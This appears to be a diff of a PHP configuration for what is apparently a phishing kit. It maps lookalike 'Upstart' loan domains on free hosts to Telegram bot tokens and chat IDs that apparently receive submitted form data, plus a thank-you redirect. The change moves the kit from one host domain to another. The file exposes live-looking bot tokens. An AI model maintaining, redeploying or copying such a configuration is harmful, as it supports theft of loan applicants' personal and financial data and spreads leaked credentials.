@@ -39,13 +39,13 @@ $site_map = [
     ],
 
     
-    'upstartsloan.42web.io' => [
+    'upstartloansllc.onrender.com' => [
         'bots' => [
             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '5651009105:AAHaRNsOqggJM3Fl9sgRewqnXJJ7Dc326Rw', 'chat_id' => '2004020590']
 
         ],
-        'redirect' => 'https://upstartsloan.42web.io/cache_site/thankyou.html'
+        'redirect' => 'https://upstartloansllc.onrender.com/cache_site/thankyou.html'
     ],
 
 
